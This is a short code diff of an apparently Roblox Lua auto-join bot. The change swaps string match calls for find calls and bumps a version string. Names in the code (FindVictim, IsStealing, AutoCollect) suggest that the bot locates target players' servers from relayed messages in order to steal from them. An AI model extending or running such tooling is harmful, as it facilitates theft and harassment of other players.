@@ -204,8 +204,8 @@ local function Scan(Tp, Json)
                         jobid = content:match("&launchData=%d+/(.+)%)"),
                         placeid = tonumber(content:match("&launchData=(%d+)/")),
                         userid = embed.footer.text:match("User Id: (.+)"),
-                        completed = content:match("Completed"),
-                        saturated = content:match("Completed") or content:match("Progress")
+                        completed = content:find("Completed"),
+                        saturated = content:find("Completed") or content:find("Progress")
                     }
                     local AJdata = AutjoinData
                     if Tp and not IsMarked(msg.id) and AJdata.saturated == nil then
@@ -243,7 +243,7 @@ end
 local function FindVictim(Json)
     if not Json or game.JobId ~= Json.jobid then
         if game.JobId ~= Json.jobid then
-            PublishMessage(AutoCollect.BotInfoChannel, "(v6.3) Auto-Join started running on " .. LocalPlayer.Name)
+            PublishMessage(AutoCollect.BotInfoChannel, "(v6.4) Auto-Join started running on " .. LocalPlayer.Name)
         end
         return
     end
@@ -330,7 +330,7 @@ task.spawn(function()
         end
     else
         warn("No auto-join file")
-        PublishMessage(AutoCollect.BotInfoChannel, "(v6.3) Auto-Join started running on " .. LocalPlayer.Name)
+        PublishMessage(AutoCollect.BotInfoChannel, "(v6.4) Auto-Join started running on " .. LocalPlayer.Name)
         IsStealing = false
     end
 end)
